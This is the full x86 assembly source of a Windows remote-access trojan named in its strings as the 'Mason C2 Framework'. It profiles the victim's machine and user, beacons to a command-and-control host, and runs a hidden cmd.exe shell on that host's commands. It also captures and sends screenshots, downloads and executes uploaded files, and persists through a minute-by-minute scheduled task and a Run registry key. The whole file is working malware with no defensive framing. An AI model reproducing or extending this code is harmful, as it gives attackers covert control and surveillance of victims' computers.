.386
.model flat, stdcall
option casemap:none

include client_config.inc

NULL                equ 0
TRUE                equ 1
FALSE               equ 0
SW_HIDE             equ 0
AF_INET             equ 2
SOCK_STREAM         equ 1
IPPROTO_TCP         equ 6
INVALID_SOCKET      equ -1
SOCKET_ERROR        equ -1
MAX_PATH            equ 260
SRCCOPY             equ 00CC0020h
DIB_RGB_COLORS      equ 0
SM_CXSCREEN         equ 0
SM_CYSCREEN         equ 1
STARTF_USESTDHANDLES equ 100h
STARTF_USESHOWWINDOW equ 1h
MEM_COMMIT          equ 1000h
MEM_RESERVE         equ 2000h
PAGE_READWRITE      equ 04h
HKEY_CURRENT_USER   equ 80000001h
KEY_SET_VALUE       equ 0002h
REG_SZ              equ 1
INFINITE            equ 0FFFFFFFFh
FILE_ATTRIBUTE_HIDDEN equ 02h
FILE_ATTRIBUTE_SYSTEM equ 04h
HALFTONE            equ 4
CAP_W               equ 800
CAP_H               equ 450
CAP_ROW             equ (CAP_W * 3)
CAP_PIX             equ (CAP_ROW * CAP_H)
CAP_TOTAL           equ (CAP_PIX + 40)
SW_SHOWNORMAL       equ 1
GENERIC_WRITE       equ 40000000h
CREATE_ALWAYS       equ 2
FILE_ATTRIBUTE_NORMAL equ 80h
MEM_RELEASE         equ 8000h

WSADATA STRUCT
    wVersion        WORD ?
    wHighVersion    WORD ?
    szDescription   BYTE 257 dup(?)
    szSystemStatus  BYTE 129 dup(?)
    iMaxSockets     WORD ?
    iMaxUdpDg       WORD ?
    lpVendorInfo    DWORD ?
WSADATA ENDS

sockaddr_in STRUCT
    sin_family  WORD ?
    sin_port    WORD ?
    sin_addr    DWORD ?
    sin_zero    BYTE 8 dup(0)
sockaddr_in ENDS

BITMAPINFOHEADER STRUCT
    biSize          DWORD ?
    biWidth         DWORD ?
    biHeight        DWORD ?
    biPlanes        WORD ?
    biBitCount      WORD ?
    biCompression   DWORD ?
    biSizeImage     DWORD ?
    biXPelsPerMeter DWORD ?
    biYPelsPerMeter DWORD ?
    biClrUsed       DWORD ?
    biClrImportant  DWORD ?
BITMAPINFOHEADER ENDS

STARTUPINFOA STRUCT
    cb_             DWORD ?
    lpReserved      DWORD ?
    lpDesktop       DWORD ?
    lpTitle         DWORD ?
    dwX             DWORD ?
    dwY             DWORD ?
    dwXSize         DWORD ?
    dwYSize         DWORD ?
    dwXCountChars   DWORD ?
    dwYCountChars   DWORD ?
    dwFillAttribute DWORD ?
    dwFlags_        DWORD ?
    wShowWindow_    WORD ?
    cbReserved2     WORD ?
    lpReserved2     DWORD ?
    hStdInput_      DWORD ?
    hStdOutput_     DWORD ?
    hStdError_      DWORD ?
STARTUPINFOA ENDS

PROCESS_INFORMATION STRUCT
    hProcess    DWORD ?
    hThread     DWORD ?
    dwProcessId DWORD ?
    dwThreadId  DWORD ?
PROCESS_INFORMATION ENDS

SECURITY_ATTRIBUTES STRUCT
    nLength             DWORD ?
    lpSecurityDescriptor DWORD ?
    bInheritHandle      DWORD ?
SECURITY_ATTRIBUTES ENDS

OSVERSIONINFOA STRUCT
    dwOSVersionInfoSize DWORD ?
    dwMajorVersion      DWORD ?
    dwMinorVersion      DWORD ?
    dwBuildNumber       DWORD ?
    dwPlatformId        DWORD ?
    szCSDVersion        BYTE 128 dup(?)
OSVERSIONINFOA ENDS

HOSTENT STRUCT
    h_name      DWORD ?
    h_aliases   DWORD ?
    h_addrtype  WORD ?
    h_length    WORD ?
    h_addr_list DWORD ?
HOSTENT ENDS

GetModuleHandleA    PROTO :DWORD
LoadLibraryA        PROTO :DWORD
GetProcAddress      PROTO :DWORD, :DWORD
ExitProcess         PROTO :DWORD
Sleep               PROTO :DWORD
lstrlenA            PROTO :DWORD
lstrcpyA            PROTO :DWORD, :DWORD
lstrcatA            PROTO :DWORD, :DWORD
lstrcmpA            PROTO :DWORD, :DWORD
GetModuleFileNameA  PROTO :DWORD, :DWORD, :DWORD
CloseHandle         PROTO :DWORD
VirtualAlloc        PROTO :DWORD, :DWORD, :DWORD, :DWORD
VirtualFree         PROTO :DWORD, :DWORD, :DWORD
GetComputerNameA    PROTO :DWORD, :DWORD
GetEnvironmentVariableA PROTO :DWORD, :DWORD, :DWORD
CreateDirectoryA    PROTO :DWORD, :DWORD
CopyFileA           PROTO :DWORD, :DWORD, :DWORD
SetFileAttributesA  PROTO :DWORD, :DWORD
CreatePipe          PROTO :DWORD, :DWORD, :DWORD, :DWORD
CreateProcessA      PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
WaitForSingleObject PROTO :DWORD, :DWORD
ReadFile            PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
WriteFile           PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
PeekNamedPipe       PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
GetVersionExA       PROTO :DWORD  ;; kept for compat
GetUserNameA        PROTO :DWORD, :DWORD
GetSystemMetrics    PROTO :DWORD
CreateFileA         PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
GetTempPathA        PROTO :DWORD, :DWORD
ShellExecuteA       PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

SHGetFolderPathA    PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
IsUserAnAdmin       PROTO
RegOpenKeyExA       PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
RegSetValueExA      PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
RegCloseKey         PROTO :DWORD
TerminateProcess    PROTO :DWORD, :DWORD
GetCurrentProcess   PROTO

WSAStartup          PROTO :DWORD, :DWORD
WSACleanup          PROTO
socket              PROTO :DWORD, :DWORD, :DWORD
closesocket         PROTO :DWORD
connect             PROTO :DWORD, :DWORD, :DWORD
send                PROTO :DWORD, :DWORD, :DWORD, :DWORD
recv                PROTO :DWORD, :DWORD, :DWORD, :DWORD
htons               PROTO :DWORD
inet_addr           PROTO :DWORD
gethostname         PROTO :DWORD, :DWORD
gethostbyname       PROTO :DWORD

GetDC               PROTO :DWORD
ReleaseDC           PROTO :DWORD, :DWORD
CreateCompatibleDC  PROTO :DWORD
CreateCompatibleBitmap PROTO :DWORD, :DWORD, :DWORD
SelectObject        PROTO :DWORD, :DWORD
DeleteObject        PROTO :DWORD
DeleteDC            PROTO :DWORD
StretchBlt          PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
GetDIBits           PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
SetStretchBltMode   PROTO :DWORD, :DWORD

wsprintfA           PROTO C :DWORD, :DWORD, :VARARG

GatherInfo          PROTO
NetSendRaw          PROTO :DWORD, :DWORD, :DWORD
NetRecvRaw          PROTO :DWORD, :DWORD, :DWORD
SendText            PROTO :DWORD, :DWORD
CaptureScreen       PROTO :DWORD
ExecShell           PROTO :DWORD, :DWORD
PersistSchtask      PROTO
PersistRegistry     PROTO
HandleUploadRun     PROTO :DWORD
ResolveHost         PROTO :DWORD
StartShell          PROTO
ShellExecCmd        PROTO :DWORD, :DWORD

includelib kernel32.lib
includelib user32.lib
includelib gdi32.lib
includelib ws2_32.lib
includelib advapi32.lib
includelib shell32.lib
includelib msvcrt.lib

.data

include client_host.inc

szCmdSS         db "mason_screenshot", 0
szCmdSSF        db "mason_screenshot_fast", 0
szCmdStop       db "mason_kill_process", 0
szCmdUpRun      db "mason_uploadrun", 0
szCmdExe        db "cmd.exe", 0
szCRLF          db 13, 10, 0
szOK            db "OK", 0
szReady         db "READY", 0
szGreetFmt      db "ID_%s | from %s (OS: %s) (User: %s) (WinVer: %s) | .", 0
szUacTrue       db "True", 0
szUacFalse      db "False", 0
szWin11         db "Windows 11", 0
szWin10         db "Windows 10", 0
szWin81         db "Windows 8.1", 0
szWin8          db "Windows 8", 0
szWin7          db "Windows 7", 0
szWinVista      db "Windows Vista", 0
szWinXP         db "Windows XP", 0
szWinUnk        db "Windows", 0
szNtdll         db "ntdll.dll", 0
szRtlGetVer     db "RtlGetVersion", 0
szAppData       db "APPDATA", 0
szRegRunKey     db "Software\Microsoft\Windows\CurrentVersion\Run", 0
szRegValName    db "BasicC2", 0
szOpenVerb      db "open", 0
szSchtasks      db "schtasks.exe", 0
szSchtFmt       db 'schtasks.exe /create /f /sc minute /mo 1 /tn "%s" /tr "%s"', 0

szMason_A       db "Mason C2 Framework", 0
szMason_B       db "BasicC2 ASM Edition", 0
szMason_C       db "CodedByABOLHB", 0
szMason_D       db "abolhb.com", 0
szMason_E       db "Mason GatherInfo", 0
szMason_F       db "Mason CaptureScreen", 0
szMason_G       db "Mason ExecShell", 0
szMason_H       db "Mason NetSendRaw", 0
szMason_I       db "Mason NetRecvRaw", 0
szMason_J       db "Mason SendText", 0
szMason_K       db "Mason HandleUploadRun", 0
szMason_L       db "Mason PersistStartup", 0
szMason_M       db "Mason PersistRegistry", 0
szMason_N       db "Mason DoConnect", 0
szMason_O       db "Mason DoGreeting", 0
szMason_P       db "Mason DoCmdLoop", 0
szMason_Q       db "Mason ResolveHost", 0
szMason_R       db "Mason MainLoop", 0
szMason_S       db "Mason Core Module", 0
szMason_T       db "Mason CommChannel", 0
szMason_U       db "Mason GDI Capture", 0
szMason_V       db "Mason PipeExec", 0
szMason_W       db "Mason Reconnect", 0
szMason_X       db "Mason Framework x86", 0
szMason_Y       db "Mason All Rights Reserved", 0
szMason_Z       db "Mason Build Engine", 0

.data?

wsaD            WSADATA <>
szHostname      db 128 dup(?)
szUser          db 128 dup(?)
szWinVer        db 64 dup(?)
szGreet         db 512 dup(?)
szCmdBuf        db 4096 dup(?)
szOutBuf        db 65536 dup(?)
szMyPath        db MAX_PATH dup(?)
szTempPath      db MAX_PATH dup(?)
szTempFile      db MAX_PATH dup(?)
rxBuf           db 8192 dup(?)
txHdr           db 4 dup(?)
rxHdr           db 4 dup(?)
pCapBuf         dd ?
osvi            OSVERSIONINFOA <>
dwUsrSz         dd ?
gSock           dd ?
szRecvName      db MAX_PATH dup(?)
dwResolved      dd ?
szOsName        db 64 dup(?)
hShellProc      dd ?
hShellInW       dd ?
hShellOutR      dd ?
bShellUp        dd ?
szSchtArgs      db 1024 dup(?)

.code

start:
    invoke WSAStartup, 0202h, addr wsaD
    test eax, eax
    jnz _die
    invoke GatherInfo

    IF DO_PERSIST_STARTUP
        invoke PersistSchtask
    ENDIF
    IF DO_PERSIST_REGISTRY
        invoke PersistRegistry
    ENDIF

    invoke VirtualAlloc, NULL, CAP_TOTAL + 4096, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    mov pCapBuf, eax

_loop:
    invoke socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
    cmp eax, INVALID_SOCKET
    je _wait
    mov gSock, eax

    call DoConnect
    test eax, eax
    jz _disc

    call DoGreeting
    call DoCmdLoop

_disc:
    invoke closesocket, gSock
_wait:
    invoke Sleep, 3000
    jmp _loop

_die:
    invoke ExitProcess, 0

ResolveHost proc uses esi edi, pHost:DWORD
    invoke inet_addr, pHost
    cmp eax, -1
    jne _rh_ok

    invoke gethostbyname, pHost
    test eax, eax
    jz _rh_fail

    assume eax:ptr HOSTENT
    mov eax, [eax].h_addr_list
    assume eax:nothing
    mov eax, [eax]
    mov eax, [eax]
_rh_ok:
    mov dwResolved, eax
    mov eax, 1
    ret
_rh_fail:
    xor eax, eax
    ret
ResolveHost endp

DoConnect proc uses edi
    LOCAL saddr:sockaddr_in
    lea edi, saddr
    push ecx
    mov ecx, sizeof sockaddr_in
    xor al, al
    rep stosb
    pop ecx
    mov saddr.sin_family, AF_INET
    invoke htons, C2_PORT
    mov saddr.sin_port, ax

    invoke ResolveHost, addr szHostEnc
    test eax, eax
    jz _dc_fail
    mov eax, dwResolved
    mov saddr.sin_addr, eax

    invoke connect, gSock, addr saddr, sizeof sockaddr_in
    .if eax == SOCKET_ERROR
        xor eax, eax
        ret
    .endif
    mov eax, 1
    ret
_dc_fail:
    xor eax, eax
    ret
DoConnect endp

DoGreeting proc
    invoke wsprintfA, addr szGreet, addr szGreetFmt, \
        addr szHostname, addr szHostname, addr szOsName, addr szUser, addr szWinVer
    invoke SendText, gSock, addr szGreet
    ret
DoGreeting endp

DoCmdLoop proc uses ebx esi edi
    LOCAL cmdLen:DWORD

_cl:
    invoke recv, gSock, addr txHdr, 4, 0
    .if eax != 4
        ret
    .endif
    movzx eax, byte ptr txHdr[0]
    shl eax, 24
    movzx ecx, byte ptr txHdr[1]
    shl ecx, 16
    or eax, ecx
    movzx ecx, byte ptr txHdr[2]
    shl ecx, 8
    or eax, ecx
    movzx ecx, byte ptr txHdr[3]
    or eax, ecx
    mov cmdLen, eax
    .if eax <= 0 || eax >= 8192
        ret
    .endif

    invoke NetRecvRaw, gSock, addr rxBuf, cmdLen
    .if eax == 0
        ret
    .endif
    mov eax, cmdLen
    mov byte ptr rxBuf[eax], 0

    invoke lstrcmpA, addr rxBuf, addr szCmdStop
    test eax, eax
    jz _cl_exit

    invoke lstrcmpA, addr rxBuf, addr szCmdSS
    .if eax == 0
        invoke CaptureScreen, gSock
        jmp _cl
    .endif

    invoke lstrcmpA, addr rxBuf, addr szCmdSSF
    .if eax == 0
        invoke CaptureScreen, gSock
        jmp _cl
    .endif

    invoke lstrcmpA, addr rxBuf, addr szCmdUpRun
    .if eax == 0
        invoke HandleUploadRun, gSock
        jmp _cl
    .endif

    invoke ShellExecCmd, gSock, addr rxBuf
    jmp _cl

_cl_exit:
    .if bShellUp != 0
        invoke TerminateProcess, hShellProc, 0
        invoke CloseHandle, hShellProc
        invoke CloseHandle, hShellInW
        invoke CloseHandle, hShellOutR
        mov bShellUp, 0
    .endif
    invoke ExitProcess, 0
    ret
DoCmdLoop endp

HandleUploadRun proc uses ebx esi edi, sk:DWORD
    LOCAL nameLen:DWORD
    LOCAL fileLen:DWORD
    LOCAL hFile:DWORD
    LOCAL dwWritten:DWORD
    LOCAL pFileBuf:DWORD
    LOCAL totalRecv:DWORD

    invoke SendText, sk, addr szReady

    invoke recv, sk, addr rxHdr, 4, 0
    .if eax != 4
        invoke SendText, sk, addr szOK
        ret
    .endif
    movzx eax, byte ptr rxHdr[0]
    shl eax, 24
    movzx ecx, byte ptr rxHdr[1]
    shl ecx, 16
    or eax, ecx
    movzx ecx, byte ptr rxHdr[2]
    shl ecx, 8
    or eax, ecx
    movzx ecx, byte ptr rxHdr[3]
    or eax, ecx
    mov nameLen, eax

    .if eax <= 0 || eax >= MAX_PATH
        invoke SendText, sk, addr szOK
        ret
    .endif

    invoke recv, sk, addr szRecvName, nameLen, 0
    .if eax <= 0
        invoke SendText, sk, addr szOK
        ret
    .endif
    mov eax, nameLen
    mov byte ptr szRecvName[eax], 0

    invoke recv, sk, addr rxHdr, 4, 0
    .if eax != 4
        invoke SendText, sk, addr szOK
        ret
    .endif
    movzx eax, byte ptr rxHdr[0]
    shl eax, 24
    movzx ecx, byte ptr rxHdr[1]
    shl ecx, 16
    or eax, ecx
    movzx ecx, byte ptr rxHdr[2]
    shl ecx, 8
    or eax, ecx
    movzx ecx, byte ptr rxHdr[3]
    or eax, ecx
    mov fileLen, eax

    .if eax <= 0 || eax > 10000000h
        invoke SendText, sk, addr szOK
        ret
    .endif

    invoke VirtualAlloc, NULL, fileLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    .if eax == NULL
        invoke SendText, sk, addr szOK
        ret
    .endif
    mov pFileBuf, eax

    mov totalRecv, 0
@@urRecv:
    mov eax, fileLen
    sub eax, totalRecv
    .if eax <= 0
        jmp @@urSave
    .endif
    mov ecx, eax
    .if ecx > 32768
        mov ecx, 32768
    .endif
    mov eax, pFileBuf
    add eax, totalRecv
    invoke recv, sk, eax, ecx, 0
    .if eax == SOCKET_ERROR || eax == 0
        invoke VirtualFree, pFileBuf, 0, MEM_RELEASE
        invoke SendText, sk, addr szOK
        ret
    .endif
    add totalRecv, eax
    jmp @@urRecv

@@urSave:
    invoke GetTempPathA, MAX_PATH, addr szTempPath
    invoke lstrcpyA, addr szTempFile, addr szTempPath
    invoke lstrcatA, addr szTempFile, addr szRecvName

    invoke CreateFileA, addr szTempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == -1
        invoke VirtualFree, pFileBuf, 0, MEM_RELEASE
        invoke SendText, sk, addr szOK
        ret
    .endif
    mov hFile, eax
    invoke WriteFile, hFile, pFileBuf, fileLen, addr dwWritten, NULL
    invoke CloseHandle, hFile

    invoke VirtualFree, pFileBuf, 0, MEM_RELEASE

    invoke ShellExecuteA, NULL, addr szOpenVerb, addr szTempFile, NULL, NULL, SW_SHOWNORMAL

    invoke SendText, sk, addr szOK
    ret
HandleUploadRun endp

GatherInfo proc
    LOCAL hNt:DWORD
    LOCAL pfn:DWORD

    invoke gethostname, addr szHostname, 128
    mov dwUsrSz, 128
    invoke GetUserNameA, addr szUser, addr dwUsrSz

    mov osvi.dwOSVersionInfoSize, sizeof OSVERSIONINFOA
    invoke LoadLibraryA, addr szNtdll
    mov hNt, eax
    .if eax != 0
        invoke GetProcAddress, hNt, addr szRtlGetVer
        mov pfn, eax
        .if eax != 0
            lea eax, osvi
            push eax
            call pfn
        .else
            invoke GetVersionExA, addr osvi
        .endif
    .else
        invoke GetVersionExA, addr osvi
    .endif

    mov eax, osvi.dwMajorVersion
    .if eax == 10
        .if osvi.dwBuildNumber >= 22000
            invoke lstrcpyA, addr szOsName, addr szWin11
        .else
            invoke lstrcpyA, addr szOsName, addr szWin10
        .endif
    .elseif eax == 6
        mov eax, osvi.dwMinorVersion
        .if eax == 3
            invoke lstrcpyA, addr szOsName, addr szWin81
        .elseif eax == 2
            invoke lstrcpyA, addr szOsName, addr szWin8
        .elseif eax == 1
            invoke lstrcpyA, addr szOsName, addr szWin7
        .else
            invoke lstrcpyA, addr szOsName, addr szWinVista
        .endif
    .elseif eax == 5
        invoke lstrcpyA, addr szOsName, addr szWinXP
    .else
        invoke lstrcpyA, addr szOsName, addr szWinUnk
    .endif

    invoke IsUserAnAdmin
    .if eax != 0
        invoke lstrcpyA, addr szWinVer, addr szUacTrue
    .else
        invoke lstrcpyA, addr szWinVer, addr szUacFalse
    .endif

    invoke GetModuleFileNameA, NULL, addr szMyPath, MAX_PATH
    ret
GatherInfo endp

CaptureScreen proc uses ebx esi edi, sk:DWORD
    LOCAL hScr:DWORD
    LOCAL hMem:DWORD
    LOCAL hBmp:DWORD
    LOCAL hOld:DWORD
    LOCAL sw_:DWORD
    LOCAL sh_:DWORD
    LOCAL bih:BITMAPINFOHEADER

    .if pCapBuf == NULL
        invoke SendText, sk, addr szOK
        ret
    .endif

    invoke GetDC, NULL
    mov hScr, eax
    invoke CreateCompatibleDC, hScr
    mov hMem, eax
    invoke GetSystemMetrics, SM_CXSCREEN
    mov sw_, eax
    invoke GetSystemMetrics, SM_CYSCREEN
    mov sh_, eax
    invoke CreateCompatibleBitmap, hScr, CAP_W, CAP_H
    mov hBmp, eax
    invoke SelectObject, hMem, hBmp
    mov hOld, eax
    invoke SetStretchBltMode, hMem, HALFTONE
    invoke StretchBlt, hMem, 0, 0, CAP_W, CAP_H, hScr, 0, 0, sw_, sh_, SRCCOPY

    mov bih.biSize, sizeof BITMAPINFOHEADER
    mov bih.biWidth, CAP_W
    mov bih.biHeight, CAP_H
    mov bih.biPlanes, 1
    mov bih.biBitCount, 24
    mov bih.biCompression, 0
    mov bih.biSizeImage, CAP_PIX
    mov bih.biXPelsPerMeter, 0
    mov bih.biYPelsPerMeter, 0
    mov bih.biClrUsed, 0
    mov bih.biClrImportant, 0

    mov ebx, pCapBuf
    add ebx, 40
    invoke GetDIBits, hMem, hBmp, 0, CAP_H, ebx, addr bih, DIB_RGB_COLORS

    mov edi, pCapBuf
    lea esi, bih
    mov ecx, 40
    rep movsb

    invoke NetSendRaw, sk, pCapBuf, CAP_TOTAL

    invoke SelectObject, hMem, hOld
    invoke DeleteObject, hBmp
    invoke DeleteDC, hMem
    invoke ReleaseDC, NULL, hScr
    ret
CaptureScreen endp

NetSendRaw proc sk:DWORD, pBuf:DWORD, sz_:DWORD
    LOCAL sent:DWORD
    mov eax, sz_
    shr eax, 24
    mov txHdr[0], al
    mov eax, sz_
    shr eax, 16
    mov txHdr[1], al
    mov eax, sz_
    shr eax, 8
    mov txHdr[2], al
    mov eax, sz_
    mov txHdr[3], al
    invoke send, sk, addr txHdr, 4, 0

    mov sent, 0
_sr:
    mov eax, sz_
    sub eax, sent
    .if eax <= 0
        ret
    .endif
    mov ecx, eax
    .if ecx > 32768
        mov ecx, 32768
    .endif
    mov eax, pBuf
    add eax, sent
    invoke send, sk, eax, ecx, 0
    .if eax == SOCKET_ERROR
        ret
    .endif
    add sent, eax
    jmp _sr
NetSendRaw endp

NetRecvRaw proc uses ebx, sk:DWORD, pBuf:DWORD, sz_:DWORD
    LOCAL got:DWORD
    mov got, 0
@@nrLoop:
    mov eax, sz_
    sub eax, got
    .if eax <= 0
        mov eax, got
        ret
    .endif
    mov ecx, eax
    .if ecx > 32768
        mov ecx, 32768
    .endif
    mov eax, pBuf
    add eax, got
    invoke recv, sk, eax, ecx, 0
    .if eax == SOCKET_ERROR || eax == 0
        mov eax, got
        ret
    .endif
    add got, eax
    jmp @@nrLoop
NetRecvRaw endp

SendText proc sk:DWORD, pTxt:DWORD
    LOCAL tLen:DWORD
    invoke lstrlenA, pTxt
    .if eax == 0
        ret
    .endif
    mov tLen, eax
    invoke NetSendRaw, sk, pTxt, tLen
    ret
SendText endp

StartShell proc
    LOCAL hInR:DWORD
    LOCAL hOutW:DWORD
    LOCAL secA:SECURITY_ATTRIBUTES
    LOCAL si_:STARTUPINFOA
    LOCAL pi_:PROCESS_INFORMATION

    .if bShellUp != 0
        ret
    .endif

    mov secA.nLength, sizeof SECURITY_ATTRIBUTES
    mov secA.lpSecurityDescriptor, NULL
    mov secA.bInheritHandle, TRUE

    invoke CreatePipe, addr hInR, addr hShellInW, addr secA, 0
    .if eax == 0
        ret
    .endif
    invoke CreatePipe, addr hShellOutR, addr hOutW, addr secA, 0
    .if eax == 0
        invoke CloseHandle, hInR
        invoke CloseHandle, hShellInW
        ret
    .endif

    push edi
    push ecx
    lea edi, si_
    mov ecx, sizeof STARTUPINFOA
    xor al, al
    rep stosb
    pop ecx
    pop edi

    mov si_.cb_, sizeof STARTUPINFOA
    mov si_.dwFlags_, STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
    mov si_.wShowWindow_, SW_HIDE
    mov eax, hInR
    mov si_.hStdInput_, eax
    mov eax, hOutW
    mov si_.hStdOutput_, eax
    mov si_.hStdError_, eax

    invoke CreateProcessA, NULL, addr szCmdExe, NULL, NULL, TRUE, 0, NULL, NULL, addr si_, addr pi_
    .if eax == 0
        invoke CloseHandle, hInR
        invoke CloseHandle, hShellInW
        invoke CloseHandle, hShellOutR
        invoke CloseHandle, hOutW
        ret
    .endif

    mov eax, pi_.hProcess
    mov hShellProc, eax
    invoke CloseHandle, pi_.hThread
    invoke CloseHandle, hInR
    invoke CloseHandle, hOutW
    mov bShellUp, 1
    invoke Sleep, 200
    ret
StartShell endp

ShellExecCmd proc uses ebx esi, sk:DWORD, pCmd:DWORD
    LOCAL dwWr:DWORD
    LOCAL dwRd:DWORD
    LOCAL dwAv:DWORD
    LOCAL oPos:DWORD
    LOCAL waits:DWORD

    .if bShellUp == 0
        invoke StartShell
        .if bShellUp == 0
            invoke SendText, sk, addr szOK
            ret
        .endif
    .endif

    invoke lstrlenA, pCmd
    mov ecx, eax
    invoke WriteFile, hShellInW, pCmd, ecx, addr dwWr, NULL
    invoke WriteFile, hShellInW, addr szCRLF, 2, addr dwWr, NULL

    mov oPos, 0
    mov waits, 0
_sc_rd:
    invoke Sleep, 80
    inc waits

    invoke PeekNamedPipe, hShellOutR, NULL, 0, NULL, addr dwAv, NULL
    .if eax == 0
        mov bShellUp, 0
        jmp _sc_send
    .endif
    .if dwAv == 0
        cmp waits, 25
        jge _sc_send
        cmp oPos, 0
        je _sc_rd
        invoke Sleep, 50
        invoke PeekNamedPipe, hShellOutR, NULL, 0, NULL, addr dwAv, NULL
        .if dwAv == 0
            jmp _sc_send
        .endif
    .endif

    mov ebx, 64000
    sub ebx, oPos
    .if ebx <= 0
        jmp _sc_send
    .endif
    .if dwAv < ebx
        mov ebx, dwAv
    .endif
    lea esi, szOutBuf
    add esi, oPos
    invoke ReadFile, hShellOutR, esi, ebx, addr dwRd, NULL
    .if eax != 0
        mov eax, dwRd
        add oPos, eax
    .endif
    jmp _sc_rd

_sc_send:
    lea eax, szOutBuf
    add eax, oPos
    mov byte ptr [eax], 0

    .if oPos == 0
        invoke SendText, sk, addr szOK
    .else
        invoke SendText, sk, addr szOutBuf
    .endif
    ret
ShellExecCmd endp

ExecShell proc sk:DWORD, pCmd:DWORD
    invoke ShellExecCmd, sk, pCmd
    ret
ExecShell endp

PersistSchtask proc uses esi edi
    LOCAL szDstPath[MAX_PATH]:BYTE
    LOCAL szTaskName[MAX_PATH]:BYTE
    LOCAL si_:STARTUPINFOA
    LOCAL pi_:PROCESS_INFORMATION

    invoke GetEnvironmentVariableA, addr szAppData, addr szDstPath, MAX_PATH
    invoke lstrlenA, addr szDstPath
    mov esi, eax
    lea edi, szDstPath
    add edi, esi
    mov byte ptr [edi], 5Ch
    inc edi

    invoke lstrlenA, addr szMyPath
    mov ecx, eax
    lea esi, szMyPath
    add esi, ecx
@@bk:
    cmp esi, offset szMyPath
    jbe @@nb
    dec esi
    cmp byte ptr [esi], 5Ch
    je @@fb
    jmp @@bk
@@fb:
    inc esi
    jmp @@gn
@@nb:
    lea esi, szMyPath
@@gn:
    invoke lstrcpyA, edi, esi
    invoke CopyFileA, addr szMyPath, addr szDstPath, FALSE

    invoke lstrcpyA, addr szTaskName, esi
    invoke lstrlenA, addr szTaskName
    .if eax > 4
        lea edi, szTaskName
        add edi, eax
        sub edi, 4
        cmp byte ptr [edi], '.'
        jne @@noext
        mov byte ptr [edi], 0
    .endif
@@noext:

    invoke wsprintfA, addr szSchtArgs, addr szSchtFmt, addr szTaskName, addr szDstPath

    push edi
    push ecx
    lea edi, si_
    mov ecx, sizeof STARTUPINFOA
    xor al, al
    rep stosb
    pop ecx
    pop edi
    mov si_.cb_, sizeof STARTUPINFOA
    mov si_.dwFlags_, STARTF_USESHOWWINDOW
    mov si_.wShowWindow_, SW_HIDE

    invoke CreateProcessA, NULL, addr szSchtArgs, NULL, NULL, FALSE, 0, NULL, NULL, addr si_, addr pi_
    .if eax != 0
        invoke WaitForSingleObject, pi_.hProcess, 10000
        invoke CloseHandle, pi_.hProcess
        invoke CloseHandle, pi_.hThread
    .endif
    ret
PersistSchtask endp

PersistRegistry proc
    LOCAL hKey:DWORD
    invoke RegOpenKeyExA, HKEY_CURRENT_USER, addr szRegRunKey, 0, KEY_SET_VALUE, addr hKey
    .if eax == 0
        invoke lstrlenA, addr szMyPath
        inc eax
        invoke RegSetValueExA, hKey, addr szRegValName, 0, REG_SZ, addr szMyPath, eax
        invoke RegCloseKey, hKey
    .endif
    ret
PersistRegistry endp

end start
